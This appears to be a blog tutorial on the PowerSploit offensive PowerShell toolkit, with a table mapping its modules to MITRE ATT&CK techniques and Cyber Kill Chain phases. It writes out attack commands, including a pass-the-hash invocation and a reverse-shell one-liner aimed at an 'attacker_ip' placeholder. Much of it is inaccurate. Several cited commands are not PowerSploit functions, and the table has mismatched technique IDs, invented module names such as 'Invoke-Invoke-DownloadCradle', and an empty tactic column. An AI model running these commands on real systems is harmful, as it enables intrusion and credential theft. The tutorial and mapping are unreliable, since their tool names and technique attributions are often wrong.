---
date: 2024-10-24
title: PowerSploit MITRE and Cyber Kill Chain mapping
type: Technical Guide
topic: MITRE & Cyber Kill Chain
reference: https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon
---
# A Step-by-Step Guide to Using PowerSploit for Penetration Testing

PowerSploit is a powerful collection of PowerShell scripts that can be used for various penetration testing tasks, including information gathering, exploitation, and post-exploitation. This guide will walk you through the steps to effectively use PowerSploit in your security assessments.

## What is PowerSploit?

PowerSploit is an open-source framework designed for offensive security professionals. It provides a suite of tools that can be used to automate tasks and enhance the capabilities of penetration testers. The framework is particularly useful for engagements involving Windows environments, as it leverages PowerShell, a powerful scripting language built into Windows.

## Prerequisites

Before you start using PowerSploit, ensure you have the following:

- **Windows Operating System**: PowerSploit is designed for Windows environments.
- **PowerShell**: Make sure you have PowerShell installed (it comes pre-installed on Windows).
- **Execution Policy**: You may need to set your PowerShell execution policy to allow script execution. You can do this by running PowerShell as an administrator and executing:
  ```powershell
  Set-ExecutionPolicy RemoteSigned
  ```

## Step 1: Download PowerSploit

1. **Clone the Repository**: Open PowerShell and navigate to the directory where you want to download PowerSploit. Use the following command to clone the repository from GitHub:
   ```powershell
   git clone https://github.com/PowerShellMafia/PowerSploit.git
   ```

2. **Navigate to the Directory**: Change to the PowerSploit directory:
   ```powershell
   cd PowerSploit
   ```

## Step 2: Load PowerSploit Modules

PowerSploit consists of several modules, each serving different purposes. You can load specific modules as needed. For example, to load the `Exfiltration` module, use the following command:

```powershell
Import-Module .\Exfiltration\Exfiltration.ps1
```

You can also load all modules at once by running:

```powershell
Get-ChildItem -Path .\* -Recurse -Include *.ps1 | ForEach-Object { . $_.FullName }
```

## Step 3: Explore Available Commands

Once the modules are loaded, you can explore the available commands. Use the `Get-Command` cmdlet to list all the functions available in PowerSploit:

```powershell
Get-Command -Module PowerSploit
```

## Step 4: Conduct Information Gathering

PowerSploit provides various functions for information gathering. For example, to gather information about the current user, you can use:

```powershell
Get-UserInfo
```

To enumerate local users, you can run:

```powershell
Get-LocalUser
```

## Step 5: Exploitation Techniques

PowerSploit includes several exploitation techniques. For example, if you want to perform a pass-the-hash attack, you can use the `Invoke-PTH` command:

```powershell
Invoke-PTH -Username "user" -Domain "domain" -Hash "hash"
```

Make sure to replace `"user"`, `"domain"`, and `"hash"` with the appropriate values.

## Step 6: Post-Exploitation

After successfully exploiting a target, you may want to maintain access or gather more information. PowerSploit provides several post-exploitation tools. For example, to create a reverse shell, you can use:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress "attacker_ip" -Port "attacker_port"
```

Replace `"attacker_ip"` and `"attacker_port"` with your attacker's IP address and port number.

## Step 7: Clean Up

After completing your testing, it’s important to clean up any artifacts left on the target system. You can use PowerSploit to remove any scripts or tools you deployed during your assessment.

## Conclusion

PowerSploit is a versatile tool that can significantly enhance your penetration testing efforts. By following the steps outlined in this guide, you can effectively utilize PowerSploit for various tasks, from information gathering to exploitation and post-exploitation activities. Always remember to use these tools responsibly and only in environments where you have explicit permission to conduct testing.

### Disclaimer

This guide is intended for educational purposes only. Ensure you have proper authorization before conducting any penetration testing activities. Misuse of these tools can lead to legal consequences. Always adhere to ethical hacking practices.

Source: https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon

---
<div style="text-align: center;">
	<div class="gradient-text">👾 2024 rabb1th0les (Chris A)dams 👾</div> 
	🌴☀Thanks for supporting my page ☀🌴
	<nav>
		<ul style="list-style: none; padding: 0;">
			<div style="text-align: center;">
				<li><a href="index.html">Home</a> | <a href="Contact.html">Contact</a></li>
			</div>
		</ul>
	</nav>	
</div>

### PowerSploit Modules Mapped to MITRE ATT&CK Framework & Cyber Kill Chain

The MITRE ATT&CK framework is a knowledge base of adversary behavior based on real-world observations. Below is a mapping of some key PowerSploit modules to the relevant MITRE ATT&CK techniques.

| **PowerSploit Module**           | **MITRE ATT&CK Tactic | **MITRE ATT&CK Technique**                                   | **Technique ID** | **Cyber Kill Chain Phase** | **Description**                                    |
| -------------------------------- | --------------------- | ------------------------------------------------------------ | ---------------- | -------------------------- | -------------------------------------------------- |
| **Exfiltration**                 |                       | Exfiltration Over Command and Control Channel                | T1041            | Action on Objectives       | Extracting data from the target environment.       |
| **Invoke-ReflectivePEInjection** |                       | Reflective PE Injection                                      | T1055.001        | Exploitation               | Injecting malicious code into running processes.   |
| **Invoke-MaliciousShell**        |                       | Remote Services - SSH Hijacking                              | T1571            | Action on Objectives       | Cleaning up after an exploit.                      |
| **Invoke-PowerShellTcp**         |                       | Remote Access - Remote Services                              | T1021.001        | Delivery                   | Setting up a reverse shell for exploitation.       |
| **Get-UserInfo**                 |                       | Account Discovery                                            | T1087            | Reconnaissance             | Gathering user information.                        |
| **Get-LocalUser**                |                       | Account Discovery                                            | T1087            | Reconnaissance             | Enumerating local user accounts.                   |
| **Invoke-Mimikatz**              | Credential Access     | Credential Dumping                                           | T1003            | Exploitation               | Extracting credentials from memory.                |
| **Invoke-ExpressCredential**     | Credential Access     | Credentials from Password Stores: Windows Credential Manager | T1555.004        | Exploitation               |                                                    |
| **Invoke-AccessToken**           |                       | Access Token Manipulation                                    | T1134            |                            |                                                    |
| **Get-Process**                  |                       | Process Discovery                                            | T1057            |                            |                                                    |
| **Invoke-Shellcode**             |                       | Command and Scripting Interpreter                            | T1059.001        | Exploitation               | Executing payloads directly for command execution. |
| **Invoke-Invoke-DownloadCradle** |                       | Download and Execute                                         | T1203            |                            |                                                    |

### Conclusion

Mapping PowerSploit modules to the MITRE ATT&CK framework and the Cyber Kill Chain can greatly improve your understanding of adversarial tactics and techniques. This knowledge can help you enhance your penetration testing strategies and make better-informed decisions during security assessments.

---
<div style="text-align: center;">
	<div class="gradient-text">👾 2024 rabb1th0les (Chris A)dams 👾</div> 
	🌴☀Thanks for supporting my page ☀🌴
	<nav>
		<ul style="list-style: none; padding: 0;">
			<div style="text-align: center;">
				<li><a href="index.html">Home</a> | <a href="Contact.html">Contact</a></li>
			</div>
		</ul>
	</nav>	
</div>